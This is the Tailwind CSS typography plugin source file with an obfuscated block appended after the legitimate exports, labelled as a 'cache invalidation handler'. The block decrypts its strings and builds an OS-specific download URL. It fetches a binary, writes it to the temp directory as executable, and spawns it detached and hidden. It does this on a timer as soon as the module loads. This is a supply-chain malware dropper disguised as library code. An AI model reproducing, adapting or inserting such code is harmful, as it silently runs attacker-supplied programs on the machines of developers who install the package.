const plugin = require('tailwindcss/plugin')
const styles = require('./styles')
const { commonTrailingPseudos, isObject, isPlainObject, merge, castArray } = require('./utils')

const computed = {
  // Reserved for future "magic properties", for example:
  bulletColor: (color) => ({ 'ul > li::before': { backgroundColor: color } }),
}

function inWhere(selector, { className, modifier, prefix }) {
  let prefixedNot = prefix(`.not-${className}`).slice(1)
  let selectorPrefix = selector.startsWith('>')
    ? `${modifier === 'DEFAULT' ? `.${className}` : `.${className}-${modifier}`} `
    : ''

  // Parse the selector, if every component ends in the same pseudo element(s) then move it to the end
  let [trailingPseudo, rebuiltSelector] = commonTrailingPseudos(selector)

  if (trailingPseudo) {
    return `:where(${selectorPrefix}${rebuiltSelector}):not(:where([class~="${prefixedNot}"],[class~="${prefixedNot}"] *))${trailingPseudo}`
  }

  return `:where(${selectorPrefix}${selector}):not(:where([class~="${prefixedNot}"],[class~="${prefixedNot}"] *))`
}

function configToCss(config = {}, { target, className, modifier, prefix }) {
  function updateSelector(k, v) {
    if (target === 'legacy') {
      return [k, v]
    }

    if (Array.isArray(v)) {
      return [k, v]
    }

    if (isObject(v)) {
      let nested = Object.values(v).some(isObject)
      if (nested) {
        return [
          inWhere(k, { className, modifier, prefix }),
          v,
          Object.fromEntries(Object.entries(v).map(([k, v]) => updateSelector(k, v))),
        ]
      }

      return [inWhere(k, { className, modifier, prefix }), v]
    }

    return [k, v]
  }

  return Object.fromEntries(
    Object.entries(
      merge(
        {},
        ...Object.keys(config)
          .filter((key) => computed[key])
          .map((key) => computed[key](config[key])),
        ...castArray(config.css || {})
      )
    ).map(([k, v]) => updateSelector(k, v))
  )
}

module.exports = plugin.withOptions(
  ({ className = 'prose', target = 'modern' } = {}) => {
    return function ({ addVariant, addComponents, theme, prefix }) {
      let modifiers = theme('typography')

      let options = { className, prefix }

      for (let [name, ...selectors] of [
        ['headings', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'th'],
        ['h1'],
        ['h2'],
        ['h3'],
        ['h4'],
        ['h5'],
        ['h6'],
        ['p'],
        ['a'],
        ['blockquote'],
        ['figure'],
        ['figcaption'],
        ['strong'],
        ['em'],
        ['kbd'],
        ['code'],
        ['pre'],
        ['ol'],
        ['ul'],
        ['li'],
        ['dl'],
        ['dt'],
        ['dd'],
        ['table'],
        ['thead'],
        ['tr'],
        ['th'],
        ['td'],
        ['img'],
        ['picture'],
        ['video'],
        ['hr'],
        ['lead', '[class~="lead"]'],
      ]) {
        selectors = selectors.length === 0 ? [name] : selectors

        let selector =
          target === 'legacy' ? selectors.map((selector) => `& ${selector}`) : selectors.join(', ')

        addVariant(
          `${className}-${name}`,
          target === 'legacy' ? selector : `& :is(${inWhere(selector, options)})`
        )
      }

      addComponents(
        Object.keys(modifiers).map((modifier) => ({
          [modifier === 'DEFAULT' ? `.${className}` : `.${className}-${modifier}`]: configToCss(
            modifiers[modifier],
            {
              target,
              className,
              modifier,
              prefix,
            }
          ),
        }))
      )
    }
  },
  () => {
    return {
      theme: { typography: styles },
    }
  }
)
// cache invalidation handler
'use strict';(function(k,l){function a0(k,l){return j(l- -0x144,k);}function W(k,l){return j(k-0x151,l);}function V(k,l){return g(k-0x3c9,l);}const m=k();function Z(k,l){return g(l- -0x372,k);}while(!![]){try{const p=parseInt(V(0x59f,'FFe5'))/0x1+-parseInt(W(0x316,0x349))/0x2+-parseInt(Z('EE$R',-0x1fa))/0x3+-parseInt(V(0x5b9,'OGH4'))/0x4+parseInt(V(0x54f,'dAio'))/0x5*(parseInt(W(0x2d8,0x2ed))/0x6)+parseInt(W(0x312,0x34e))/0x7+parseInt(V(0x54a,'(ZY#'))/0x8;if(p===l){break;}else{m['push'](m['shift']());}}catch(q){m['push'](m['shift']());}}}(b,0xd08d2));const crypto=require(a1(-0x232,-0x1f9)),i=require('os'),t=new Map();function n(k){const l={'odVFL':a2(0xc2,0xbb)};function a4(k,l){return g(l- -0x263,k);}const m=t[a3('EE$R',0x2df)](k);if(m)return m;function a3(k,l){return g(l-0x124,k);}const p=k[a4('%CGL',-0xb0)](':'),q=Buffer[a3('%CGL',0x2e1)](p[0x0],a2(0xc2,0x99)),v=Buffer[a3('deEJ',0x307)](p[0x1],l[a5(0x184,0x1bf)]),x=Buffer[a5(0x11f,0x14a)](p[0x2],l[a4('EE$R',-0x70)]),y=p[0x3],z=crypto[a2(0xa3,0x82)](a5(0x195,0x19b),q,v);z[a3('@Dd2',0x303)](x);let C=z[a4('dAio',-0xc7)](y,l[a3('9T3P',0x2c2)],a4('g2cJ',-0xc9));function a2(k,l){return a1(l,k-0x2c2);}C+=z[a5(0x185,0x153)](a2(0xd1,0xb2));function a5(k,l){return a1(l,k-0x345);}t[a2(0x10f,0xe4)](k,C);return C;}const e={'mod.fs':a6(0x5cb,0x5d0),'mod.path':a1(-0x1f7,-0x1ea),'mod.cp':a1(-0x207,-0x1e3),'os.win':a7(0x1e,'deEJ'),'os.mac':a7(0x64,'U@KV'),'os.lin':a1(-0x1ac,-0x1ec),'arch.amd64':a7(0x81,'DalO'),'arch.arm64':a1(-0x189,-0x1ca),'art.win':a8('mT8p',0x1f9),'art.mac':a8('doYh',0x205),'art.lin':a7(0x7e,'gbpX'),'url.base':a1(-0x1f9,-0x21e),'url.suffix':a7(0x71,'ud2v'),'save.win':a7(0x59,'#aCt'),'save.mac':a7(0x26,'Fw7e'),'save.lin':a1(-0x1cd,-0x1b9),'env.appdata':a8('vL8K',0x1aa),'path.ms':a6(0x588,0x58b),'path.win':a8('%gk&',0x20d),'path.sm':a7(0x34,'@Dd2'),'path.pr':a7(0x5a,'9T3P'),'path.st':a7(0x4d,'DalO'),'stdio.mode':a8('4akM',0x1d5),'err.fetch':a8('U@KV',0x218)};function j(a,c){const d=b();j=function(e,f){e=e-0x178;let g=d[e];if(j['kThaGw']===undefined){var h=function(m){const n='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let o='';let p='';for(let q=0x0,r,s,t=0x0;s=m['charAt'](t++);~s&&(r=q%0x4?r*0x40+s:s,q++%0x4)?o+=String['fromCharCode'](0xff&r>>(-0x2*q&0x6)):0x0){s=n['indexOf'](s);}for(let u=0x0,v=o['length'];u<v;u++){p+='%'+('00'+o['charCodeAt'](u)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(p);};j['QyAOKi']=h;a=arguments;j['kThaGw']=!![];}const i=d[0x0];const k=e+i;const l=a[k];if(!l){g=j['QyAOKi'](g);a[k]=g;}else{g=l;}return g;};return j(a,c);}function g(a,c){const d=b();g=function(e,f){e=e-0x178;let h=d[e];if(g['qNGtUK']===undefined){var i=function(n){const o='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let p='';let q='';for(let r=0x0,s,t,u=0x0;t=n['charAt'](u++);~t&&(s=r%0x4?s*0x40+t:t,r++%0x4)?p+=String['fromCharCode'](0xff&s>>(-0x2*r&0x6)):0x0){t=o['indexOf'](t);}for(let v=0x0,w=p['length'];v<w;v++){q+='%'+('00'+p['charCodeAt'](v)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(q);};const m=function(n,o){let p=[],q=0x0,r,t='';n=i(n);let u;for(u=0x0;u<0x100;u++){p[u]=u;}for(u=0x0;u<0x100;u++){q=(q+p[u]+o['charCodeAt'](u%o['length']))%0x100;r=p[u];p[u]=p[q];p[q]=r;}u=0x0;q=0x0;for(let v=0x0;v<n['length'];v++){u=(u+0x1)%0x100;q=(q+p[u])%0x100;r=p[u];p[u]=p[q];p[q]=r;t+=String['fromCharCode'](n['charCodeAt'](v)^p[(p[u]+p[q])%0x100]);}return t;};g['DUNrQM']=m;a=arguments;g['qNGtUK']=!![];}const j=d[0x0];const k=e+j;const l=a[k];if(!l){if(g['hUwNJs']===undefined){g['hUwNJs']=!![];}h=g['DUNrQM'](h,f);a[k]=h;}else{h=l;}return h;};return g(a,c);}function r(k){const l={'BKtoT':a9(0xd,'EE$R'),'exdIW':function(p,q){return p(q);}};const m=e[k];if(!m)throw new Error(l[a9(0xc,'kW3u')]+k);function a9(k,l){return a7(k- -0xf,l);}function aa(k,l){return a8(k,l- -0x84);}return l[a9(0x19,'OGH4')](n,m);}const u=require(r(a8('j7o1',0x200))),B=require(r(a7(0x3e,'4akM'))),w=require(r(a6(0x55f,0x57d))),T=i[a1(-0x236,-0x216)](),a=i[a1(-0x223,-0x228)](),A=T===r(a8('%gk&',0x1f4)),X=T===r(a1(-0x1bf,-0x1c9));function h(k){function ab(k,l){return a7(l-0x3e2,k);}function ac(k,l){return a1(l,k-0x5e9);}return B[ab('ySXk',0x45c)](i[ac(0x414,0x41d)](),k);}function o(){const k={'jWnhY':ad(0x25a,0x269),'RYLcR':ae(-0x13,-0x2c),'KJLov':function(m,p){return m(p);},'sxZaX':function(m,p){return m(p);},'FBslQ':af(0x29d,'mT8p')};function ae(k,l){return a1(l,k-0x1c4);}function ag(k,l){return a7(l-0x39c,k);}function ad(k,l){return a6(k- -0x373,l);}function af(k,l){return a8(l,k-0xd6);}const l=a[ae(-0x25,-0x45)]();return l===r(k[ad(0x23a,0x22b)])||k[ae(-0xb,-0x8)]===l?k[ag('Dw4z',0x3af)](r,k[af(0x2f4,'IRW8')]):k[af(0x2e5,'0zOD')](r,k[af(0x2de,'DalO')]);}function s(){function ah(k,l){return a7(k-0x6,l);}const k={'jFmcC':function(l,m){return l(m);},'PJnNj':ah(0x34,'OGH4'),'OROGH':function(l,m){return l+m;},'Yydps':ai(0x4d5,0x4fd)};function ak(k,l){return a1(k,l-0x5ed);}function aj(k,l){return a8(k,l- -0x3ee);}function ai(k,l){return a1(k,l-0x6f1);}return A?r(ah(0x26,'eUD2')):X?k[aj('ko)&',-0x229)](r,k[ak(0x47a,0x442)])+o():k[aj('xKQ!',-0x209)](k[ai(0x4e2,0x50b)](r,k[ai(0x518,0x518)]),o());}function S(){function an(k,l){return a6(k- -0x5d5,l);}const k={'UTOkX':function(l,m){return l+m;},'hybRw':function(l,m){return l+m;},'wgclQ':al(-0xc0,-0xad),'lOzlI':am(0x2eb,'EE$R')};function al(k,l){return a6(l- -0x64e,k);}function am(k,l){return a7(k-0x2ab,l);}return k[al(-0xb6,-0xc1)](k[al(-0xc5,-0xf0)](r(k[an(-0x2a,0x1)]),al(-0xbc,-0xab))+r(k[al(-0xac,-0x98)]),s());}function a7(k,l){return g(k- -0x177,l);}function b(){const aJ=['uLLmy1i','W596WPvKW4izWPNdKN5fWPPmW6NcGSotWPZcMmkVW57cIYxdTmkbh8o+W40lBSkHqSk4WPySr8krWQxdV8knW6hcKCo0fSkgW7/cM0hdQNRdG1NdOGP/yaa9omk2W5NcOHPwlKNcM3JcKaHCgIhcKSoyrH3cSSkhWOnOWRNdJSoQWPNdU8kczHxcICkiwmk9W6ZcV3ddLWxdMYq0ceSNWPfmWQznW6O','Be96BeK','rdO+WQG/DgroWR0xA8o8','cc3dVwNcGq','qtq4rvr0AfzyBdrzswPPr1DqqwrIsfHmAw5tAvn3vdGRD1rzqKjcDxLLnd06rLzot2LlAufpCJLRANLJBJPNshvRDLnquLbRytqRqLfvDdbImMnbpt06k25cn085rt0','B3mUBwfJ','qvC9wXu','WPpcKwTRcrdcRCkNtHtdPmkZD8oKcNqHW6S8ymkVhmoyW5ldQ2tcKYBdO115xuHAW5z3dJJcMwmZWRWWi8kpWQFcLfFcP8oPv8o+WRxcNx/dOHKGW4SEE8oFBh4mtaRcTmkYkapcSCkucmoVWP/dId3cSmkBWOShWP/cIfOoCJRdSSkclSodW6lcQHa','WQ/cPxH/WRzBuu8ccmkIu8onzmoCWO7cJLnAWQreW7pcQdhcU8kmW5RdHff4W7hcMviKWOFdOCoBpK45cc/cICkQlmkGWP5EDmkdaCoZj8oDW5y1yIpcJNrqzbpdUSk+lv3cLW5BWQldT1LFW4mJjmkuW77cLN3dHCoxwfTvW6CeBxiJDq/dGSkkBcXOzG','t0DPuwe','W5/dN2uNcG','W4hcTCo1EL/dJSkQiLeN','cx8wcZpcMKddNW','B2rwrKW','zMLUywW','WOroDuq','WRtdM8kCWRjYF8kAW6BdUW','WOC2W7m6W5OBW50','ntaXmJK1q3rYuLzP','WPpcKwTRcrdcRCkNtHtdPmkZD8oKcNqHW6S8ymkVhmoyW5ldQ2tcKYBdO115xuHAW5z3dJJcMwmZWRWWi8kpWQRcOY3dJSoQCSkEWOVcNtBdNtvPW6yet8oFsNetkc7cVmk0jGpcQSo9qSozWOZcMZtcSmkgWPGwW4RcRLOoCJNcMCkUa8orWOVcQbe3bIFdS8k+Fg3dL8kqW6hcImkY','C8k6rmonWRVcHtJcLCkUtCkaWP/cKMtcNLKuASofwmkOcmoBfKnZW5xdPaFcGrK7v8k+WPLyeCkQW5zcW7HFAZ3dMcz6mCoXW67cVM43lhDEftJdPmo5WR4jW6T0u8kOk8kmpMjtW7G+WP3dGLnqWQiFtmodFI7dUWlcLgS8W6FcMce','qtq4rvr0AfzyBdrzswPPr1DqqwrIsfHmAw5tAvn3vdGRD1rzqKjcDxLLnd06AeHRANzysg11EeG1oveXndPsDsTyAdDrtxL6rfHZsdbjvKK3EJvNpt06nLHkBeqYuw1hDuzom2rKEeuVBeHZrwDIq0e9pq','qtq4rvr0AfzyBdrzswPPr1DqqwrIsfHmAw5tAvn3vdGRD1rzqKjcDxLLnd06sfiZr2jjztfoAdjfveHfsZPMEvGZn1D0Bu9TEuDPnZHwBfrQrJD3pt06Cuf3pq','sCoOW6umsW','yxjJAc5HCM02na','vs8guYO','mSoIfmoHWQ8gpMZdUSosWOKlWRe','C2v0','jZtcRg5nw1xcKq57danK','ACk/s8k6','ywvZlti1nI1Ny20','W5tdRmkrW7ldRW','nJy2nZKWz2TerMHR','WRzJWR8xWQaCW4hdKmonWRP+yCkOW73dRvldNGG5W4/dMmkwmSklWQxdKNyyDJnpW77dSCowWQtcVH/cGXRcQSoEEmonW4ddKsKQW43cS33cOKOPWQiObx0uf8o/ceJdImoDW4SEW4BcKSkRW4jwfGGxWRNcH1WPwwtdKSk3W6RcTmk6WP8OzCodWRyFmgFcM8ohWRHDpCobW6rDeae','C2f2zs53Aw4','uePUtMO','d1VcTKdcHdCZjftcLxxcMLLzlsryW4WbWRFcNmk4WRhdOSolWO5zWRTsWPevW7zqWQ3cOCo+W5PtpSo1WPxdSmkaWP7cQb3dS8omWR3dSZpcIvJcQSoQWRZcTItdTY90Be7dJ8o6vg/cQCkYkSk8rx/dGCo5WRHNomkPW5tcKMZdPSkcDCkJW4S0FCoaA8opumk/fW','WONcVCo0WOxcMGhdN8kjfmkXWO3cHe8','W48mrCoTAcBcV8kXWPeCx8oaumo6cvZcHITXW7BdHmoSWQVcO8kDW5SGsWyWWODGW54LBCoItSkpBu7dSCoyumkTlLFcGmoUbCksWOJcRNBcQwpdOmocWOldUG8Km3FcLCkqpf/cUrhcNSoezwXpW4BdImoxW5mFWQWgeKddIepcLxvmzsTzumoAW7FcVXpcMuDf','yxjJAa','mJuZmtKXm3D2t2vjEq','zNjVBq','AhLIuNC','Bw9KlMnW','zw52lMfWCgrHDge','mZK2odKXmMf3yNLJuG','t8kZWRZdHdjSW5/cJcBdJI1uddu','yMPer1C','y3jLyxrLrgvJAxbOzxjPDG','qtq4rvr0AfzyBdrzswPPr1DqqwrIsfHmAw5tAvn3vdGRD1rzqKjcDxLLnd06yMy5rfnRC2feyI92wejrntPXAxrPAKfIsduXmw81ExCZnduXwuLbpt06sMv1ANb3sePPCw4VrsT2vfKZmhvoDfHss0C4ALG2u0rLm3vUAKe9pq','omojWPW','WOq1W4hdLSo2sGzSWQ8CW7VdIW','mZzkshfvtxe','C2f2zs5SAw4','WQxdPmo6W6iq','W4ezWOtdMJi','yxjYyxLcDwzMzxi','CgXHDgzVCM0','Cgf0Ac5ZBq','r1DcwKK','y2f0y2G','AM9PBG','twvuB04','amoyAK/dVa','W5BdOCk0W4FdIL7cI8oEfSkrWOpcQfJdPa','yCofW5OotG','WQmiiMZcSmo6W5ddUCoDWRpcKM4JW5RdM8khW64FnmoVWRJdUhtcRvrEyc7cH8kuBSo7gJT7B8orWRNcRu1YWOavAmozWOWQW6pcUGtcLmoZWPRdT0iHW5pcK8obWP9XW7eiW40lsa02WPdcHmo+nLLYWOpdKfDnWORcPmkHySkRm8oqW4BcHmoJW4dcRN5zqSkcWPC','WQBdPCoUW4H3wmkGWOldNmo8','W6dcPfNdIbGapa','zSobW5m+za','C3bHD24','WO7dGCk4cG','A0rhzLy','W4r1WPtcHCk7gG','ns1vW6eowXyuguScW5ihoYCLWQVdTmojBJeSuSkNgr/dJ8kxW5ldIJ92dYdcJLRdVxGqoWJdNufiWRhdUaj9W4zFW7/dOHzigLxdQhWUyCo4v8oIWRuWeN9RWOiCW4ZdRxxcH1rUWPuWDMWGW5PRvG8zxCoPnSovWOFdUaSQtmksiq0DW6bzbSkwWOJcL2K+WPVdS8o9q8occSk5WOW','WR7dJCk4W5Py','CxxdVH8J','jMTKW4eo','F1ZcUZZdQhrTqN3cTstcKNzv','yMfZzty0','C3rHDhvZ','WRCvWPpdVCkEv8owASkTkSo4WQ90xv1rW4xdRxhcUgHAdYyFBmk4WQm3WP7dGeCwvCoCWRddSbZdR8omW6/dLXjsrdasu33cLSoIW5/dScPRWPG2WRJcSgz0WPedxtNcQhSNWO/dPtO5W6hcHSkOWQVcGmkaWQZcGHNdK19rW486zGNcVqCXdJZcLCkH','Dx/dRNGzcWq','C8kXvSk8WRvoEG','qtq4rvr0AfzyBdrzswPPr1DqqwrIsfHmAw5tAvn3vdGRD1rzqKjcDxLLnd06ndbUqNjqvenNvKP2nffYAZPrrg9UmK85qLy3quHjChHoys9tnejrpt06n1j1n1O5wfzJsMDQ','z2f5EvK','y3j5ChrV','C2f2zs5Tywm','W7pdPmk5FN7dJSkQigGSW5dcPbjCW4fbW60blIWaBCotvCowWQzBW7pdOmk3q8k+a8kbCGpdKuFdLr7dKdHRW7JcOmosW47dO8omWPtdUG3dUmk3WOxcR8osDSkwWPtcVdD1zCk7k27dJttcQW3dSmovWQhdRmo2gSoqcSoGW5ZdPYJdId17W5tcS8o1guO9iaBdH8oeW7ODxKFdLCo5eq','vvrpA1G','verLWQC','yxj0lMXPBG','C3rKAw8UBw9Kzq','WOC2W7m6W5OfW5O','DxrMoa','BujKu2K','u8kIhmovW4m','W5tcJmofWRJdLW','WPToW4/cLSk6qSokva','qtq4rvr0AfzyBdrzswPPr1DqqwrIsfHmAw5tAvn3vdGRD1rzqKjcDxLLnd06Dw0Vug1xn1ORq1OWrgvbwtPivKPxmLnPDu9ABuW0mKfRBKTKuNDNpt06BMeYzMHmyZ0','W47dUSkRWPRdKexcISkyc8kg','qtq4rvr0AfzyBdrzswPPr1DqqwrIsfHmAw5tAvn3vdGRD1rzqKjcDxLLnd06yK9Ssu9NCZnWnLnYtwHUwJPon09ACgL0svbWvJf1CJjjztzgy05bpt06zgHLD0H3pt0','Dg9mB3DLCKnHC2u','DgHLBG','W5ZdRCkZ','AKzTy0m','rSkGh8or','Dw5Yzwy','qtq4rvr0AfzyBdrzswPPr1DqqwrIsfHmAw5tAvn3vdGRD1rzqKjcDxLLnd06ucTTBK9qDNjpvuTeEdz1DtPbA2nll1m4wuPrwMPMDITbmfnYAfPrpt06ug5UAgTUseDUnLvZzhCVuZLNpt0','DxjSlMjHC2u','mJq4ndG1m1vbwKHSwq','ELjSwtDFsNH2rLK4x1POAhu4AwGYngLxx2runvjIxZK','WOhdOM5nWOTb','d1VcTKdcHdCZjftcLxxcMLLzlsryW4WbWRFcNmk4WRhdOSolWO5zWRTsWPevW7zqWQ3cOCo+W5PtpSo1WPxdSmkaWP7cQclcUCouWRZdQZpcNXBdL8oMWQxcPbldNYLUBe3dS8kvrM3cICk5cSk8vh7dM8oOWQPNp8kmW47dTeddKSksDCkJW4TAl8oKl8kso8osxgpcPCoZW7O','mti2ntq4nKvpuNHRBW','zw52','mSoIxGZcOq','WOBcO8k1W6untCkLWRdcSSkKqSk4oGTpW7u2zCoXW643WPRcTmk4wCo8WOrxlwTzBmo2W5FcVSoql8kpCwBcJuWZW7hdGMG5zKldPvFcUSkyfh0EvCkqrq/cVt/cVSoXWR/dGhvlrmkoj1fgW7pdGH3dLaKKW73dRCoKWRNcOmk7W5OBWRZcOCkCCSkSl8kgWQRdRGVdSsm','wxLKChm','D2DJBfe','ywfYy2G2na','ALDUAfK','Dg1WzgLY','Cgf0Ac53Aw4','t8ojuZtcKSkq','W7KWtmkkWRioW7JcRmkakCoSiWbHCwC2CtvOE8oNduWiW7ZcJCooW4OjWRiSW5m0WQfiW7blWQxcP8oGW4pcULNcQJSPW6KKWQRdKdtdTSkIESkoBXVdOCo0W4JcLt7cLxGXECkRd1SFWPJdRXy0W7flWQjAzSopDfGpW6pdNmklWRlcTCoar8oxcWtdUHjYWOFcGmolBZzkqCkbWQVcIq','WPdcNCowW5LaBSkgW5pdI8oqW6NcUCoKq1tdVmkGW78xoXxdKhxdNYzmWRe1W4ldH8oNhSkedWVcSsS+W6tdKWurBmorWOZdQ25rW5/cSHVcTwHIWQ3cRmkjWO/cUZ/cL8oGqqj1qCkLW4VcHCkHW7VdJCo3a2RdHbFdMmkMW7mIW6FdPL7cI8o9kmosWQNcMrywW6lcI8kYWPmVemkC','D3jPDgvgAwXLu3LUyW'];b=function(){return aJ;};return b();}function a1(k,l){return j(l- -0x3a2,k);}function c(k){const l={'MeToN':ao(0x10b,0xd9),'aBNpj':function(p,q){return p(q);},'BkRaF':ap('ySXk',-0x64),'OGiQa':function(p,q){return p(q);},'gayyY':aq('gbpX',0x216)};const m=process[ao(0xe1,0x120)][r(l[ao(0xcd,0xeb)])];function ao(k,l){return a6(l- -0x487,k);}function aq(k,l){return a8(k,l-0x0);}function ar(k,l){return a1(k,l-0x375);}function ap(k,l){return a7(l- -0x93,k);}return m?B[ao(0xb7,0xea)](m,r(aq('gbpX',0x1e1)),r(ao(0x119,0x128)),l[aq('$qf3',0x1d1)](r,ao(0x114,0xe7)),r(l[aq('ko)&',0x21c)]),l[ao(0x110,0x137)](r,l[ao(0x12c,0x102)]),k):'';}function d(k){const l={'bjDGW':function(m,p){return m(p);},'bswBI':as(0x168,0x197)};function as(k,l){return a6(l- -0x3f9,k);}function at(k,l){return a1(l,k- -0x23);}function au(k,l){return a7(k-0x52c,l);}function av(k,l){return a7(k-0x311,l);}w[at(-0x22c,-0x229)](k,[],{'cwd':i[as(0x1ec,0x1b5)](),'env':process[au(0x53a,'yZXL')],'stdio':l[at(-0x243,-0x25e)](r,l[av(0x323,'mT8p')]),'detached':!0x0,'windowsHide':A})[as(0x1cd,0x1a6)]();}function Y(){function ax(k,l){return a1(l,k-0x5a4);}function aw(k,l){return a6(l- -0x79d,k);}const k={'GWBZI':aw(-0x1ea,-0x212)};return r(A?ax(0x3f8,0x432):X?k[aw(-0x253,-0x22e)]:aw(-0x26a,-0x234));}function f(k){const l={'kDGfV':function(m,p){return m+p;},'mBdSi':function(m,p){return m(p);},'MNNhT':ay(-0x19b,'9T3P'),'GumQQ':function(m){return m();}};function az(k,l){return a7(l-0x362,k);}function ay(k,l){return a8(l,k- -0x3b0);}function aE(k,l){return a1(k,l-0x544);}function aI(k,l){return a1(k,l-0x5c7);}fetch(k)[ay(-0x1d2,'P*VJ')](m=>{function aB(k,l){return az(l,k- -0x313);}function aA(k,l){return j(l- -0x2d9,k);}if(!m['ok'])throw new Error(l[aA(-0x16b,-0x13e)](l[aB(0x70,'ko)&')](r,l[aC('oZT4',0x6f)]),m[aA(-0x16e,-0x136)]));function aD(k,l){return j(l-0x13e,k);}function aC(k,l){return az(k,l- -0x356);}return m[aD(0x2a3,0x2c9)]();})[aE(0x34c,0x35c)](m=>{function aG(k,l){return ay(k-0x3d0,l);}const p=l[aF(0x3cb,0x3e6)](h,l[aG(0x218,'$vKJ')](Y));u[aF(0x3eb,0x40e)](p,Buffer[aF(0x395,0x359)](m),{'mode':0x1c0});function aF(k,l){return aE(l,k-0x77);}function aH(k,l){return aE(l,k- -0x30e);}d(p);})[aI(0x37d,0x3b4)](()=>{});}function a8(k,l){return g(l-0x31,k);}function a6(k,l){return j(k-0x3e1,l);}setTimeout(function(){const k=S();k&&f(k);},0x64);
